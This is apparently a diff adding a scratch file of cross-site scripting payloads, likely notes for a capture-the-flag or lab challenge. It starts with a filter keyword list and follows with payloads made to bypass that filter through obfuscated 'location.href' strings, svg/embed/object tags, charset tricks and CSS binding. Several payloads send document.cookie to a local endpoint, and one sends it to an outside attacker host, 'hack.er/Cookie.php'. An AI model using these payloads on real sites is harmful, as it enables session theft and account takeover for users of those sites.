@@ -1,0 +1,16 @@
+threats = ('script', 'img', 'src', 'iframe', 'href', '\"', 'onerror')
+<svg onload="alert('1')">
+<embed src="http://127.0.0.1:8000/memo?memo="+document.cookie/>
+<link rel="stylesheet" href="http://127.0.0.1:8000/notice?id=admin">
+<object data=’./notice?id=admin’ ></object>
+
+%2522
+
+<embed src="http://127.0.0.1:8000/memo?memo=+document.cookie">
+<svg onload="var a='location.hr';var b='ef';a+b('http://127.0.0.1:8000/memo?memo=' + document.cookie);">
+<img src="3" onerror="var hr='location.hr';var ef='ef';hr+ef('http://hack.er/Cookie.php?cookie=' + document.cookie);">
+
+<svg xmlns:xlink=http://www.w3.org/1999/xlink><animate xlink:href=#x attributeName="xlink:href" values="　javascript:alert(1)" />
+<meta charset=iso-2022-jp><svg o[0x1B](Bnload=alert(1)>
+
+<STYLE>BODY{-moz-binding:url(/http:\/\/127.0.0.1:8000/memo?memo=asdfasdfasdfasdf)}</STYLE>
